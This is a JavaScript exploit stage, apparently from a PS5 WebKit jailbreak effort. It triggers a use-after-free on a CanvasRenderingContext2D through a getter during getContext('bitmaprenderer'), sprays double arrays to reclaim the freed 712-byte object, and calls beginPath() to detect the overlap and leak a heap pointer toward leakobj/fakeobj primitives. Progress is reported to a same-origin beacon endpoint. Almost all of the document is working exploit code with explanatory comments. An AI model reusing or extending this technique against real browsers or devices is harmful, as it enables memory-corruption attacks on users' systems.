// c017: reclaim the freed 712-byte CanvasRenderingContext2D with a JSArray butterfly.
//
// Rationale (see docs/48): the FontFace-era PS5 primitive overlaps a WebCore fastMalloc object with
// JavaScriptCore's own data, which gives leakobj/fakeobj. Strings (c016) can only observe an overlap; a
// contiguous double array is writeable from JS, so an overlap becomes a real primitive.
//
// Butterfly layout for a contiguous double array: [8-byte header][8*n doubles]. n ~ 88 => ~712 bytes.
// beginPath() stores a freshly allocated Path* into the context object, so if the butterfly owns that memory
// the pointer shows up as changed array elements - proof of overlap plus a heap leak, from JS only.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c017-' + t); } catch (e) {} }
  send('boot');

  function trigger() {
    var inner = null;
    var c = document.createElement('canvas');
    var opts = {};
    Object.defineProperty(opts, 'alpha', { get: function () { inner = c.getContext('2d'); return true; } });
    try { c.getContext('bitmaprenderer', opts); } catch (e) {}
    return inner;
  }

  var inner = trigger();
  if (!inner) { send('no-context'); return; }
  send('triggered');

  // Fill with a recognisable double; any element that changes was written by the engine, not by us.
  var TAG = 1.7976931348623157e308; // max double, distinct bit pattern

  var spans = [];
  var found = null;
  for (var n = 60; n <= 130; n++) {
    var arr = new Array(n);
    for (var i = 0; i < n; i++) arr[i] = TAG;
    spans.push({ n: n, arr: arr });
  }

  // One oracle call per candidate class, then scan everything.
  for (var s = 0; s < spans.length; s++) {
    try { inner.beginPath(); } catch (e) { send('beginPath-threw@' + spans[s].n); }
    var a = spans[s].arr;
    for (var k = 0; k < a.length; k++) {
      if (a[k] !== TAG) { found = { n: spans[s].n, idx: k }; break; }
    }
    if (found) break;
  }

  if (found) {
    send('OVERLAP n=' + found.n + ' idx=' + found.idx);
  } else {
    send('no-overlap');
  }
  send('done');
})();
